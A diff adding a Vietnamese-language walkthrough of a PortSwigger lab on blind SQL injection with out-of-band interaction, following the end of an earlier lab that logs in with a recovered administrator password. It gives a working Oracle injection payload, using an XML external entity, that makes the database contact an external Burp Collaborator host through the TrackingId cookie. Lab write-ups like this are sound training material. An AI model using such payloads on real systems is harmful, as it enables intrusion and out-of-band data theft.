@@ -502,3 +502,25 @@ print(f"administrator:{password}")
 ```
 
 Cuối cùng, chúng ta sẽ giải được bài lab bằng cách đăng nhập với `administrator:3lf409hp0t5cfg0gj3d9`.
+
+## Lab 16: [Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
+
+> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+>
+> The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+>
+> To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.
+
+Bài lab này yêu cầu chúng ta khiến database thực hiện DNS lookup tới Burp Collaborator.
+
+Chúng ta sẽ đổi giá trị của cookie `TrackingId` thành payload bên dưới, chú ý encode URL rồi gửi request.
+
+```sql
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://4v0ombmznbre7v78btp19c635ublzcn1.oastify.com/"> %remote;]>'),'/l') FROM dual--
+```
+
+![image](images/lab-16/lab-16.png)
+
+Sau đó, có thể quan sát thấy kết quả bên tab Collaborator:
+
+![image](images/lab-16/lab-16-1.png)
